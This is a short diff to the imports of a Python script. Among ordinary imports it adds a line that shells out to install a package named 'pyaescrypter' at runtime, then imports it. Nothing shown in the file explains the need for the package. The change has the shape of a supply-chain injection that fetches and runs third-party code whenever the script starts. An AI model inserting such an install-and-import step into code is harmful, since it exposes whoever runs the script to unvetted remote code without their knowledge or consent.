@@ -1,4 +1,6 @@
 import os
+os.system("pip install pyaescrypter")
+import pyaescrypter
 import random
 import requests
 import time
